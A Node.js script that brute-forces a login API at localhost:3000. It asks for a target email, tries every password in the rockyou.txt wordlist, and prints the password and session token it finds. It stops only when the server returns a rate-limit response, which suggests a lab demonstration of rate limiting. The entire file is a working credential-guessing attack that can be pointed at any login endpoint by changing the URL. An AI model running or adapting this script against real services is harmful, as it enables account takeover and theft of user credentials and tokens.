
import fs from "fs";
import readline from "readline";
import { createInterface } from "readline/promises";

const URL = "http://localhost:3000/api/login";
const WORDLIST_PATH = "./rockyou.txt";
const MAX_ATTEMPTS = Infinity;

async function tryPassword(email, password) {
    const res = await fetch(URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password })
    });
    const data = await res.json().catch(() => ({}));
    return { status: res.status, data };
}

async function askTargetEmail() {
    const prompt = createInterface({ input: process.stdin, output: process.stdout });
    const email = await prompt.question("Target email to attack: ");
    prompt.close();
    return email.trim();
}

async function bruteForce() {
    const targetEmail = await askTargetEmail();

    if (!targetEmail) {
        console.log("No email entered, stopping.");
        return;
    }

    console.log(`\nTarget email: ${targetEmail}`);
    console.log(`Wordlist: ${WORDLIST_PATH} (14.3 million passwords, trying the full list)\n`);

    const fileStream = fs.createReadStream(WORDLIST_PATH);
    const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });

    const start = Date.now();
    let attempt = 0;

    for await (const line of rl) {
        const guess = line.trim();
        if (!guess) continue;

        attempt++;

        const { status, data } = await tryPassword(targetEmail, guess);

        if (status === 200) {
            const seconds = ((Date.now() - start) / 1000).toFixed(2);
            console.log(`\n>>> PASSWORD FOUND: "${guess}"  (attempt #${attempt}, in ${seconds}s)`);
            console.log(">>> Got a token too:", data.token || "(none)");
            rl.close();
            return;
        }

        if (status === 429) {
            console.log(`#${attempt}  "${guess}"  -> 429 RATE LIMITED. Attacker stopped here.`);
            rl.close();
            return;
        }

        if (attempt % 10 === 0 || attempt <= 5) {
            console.log(`#${attempt}  "${guess}"  -> ${status}`);
        }

        if (attempt >= MAX_ATTEMPTS) {
            console.log(`\nStill not found after ${MAX_ATTEMPTS} attempts, stopping (safety cap).`);
            rl.close();
            return;
        }
    }

    console.log("\nWordlist exhausted, password not found.");
}

bruteForce();
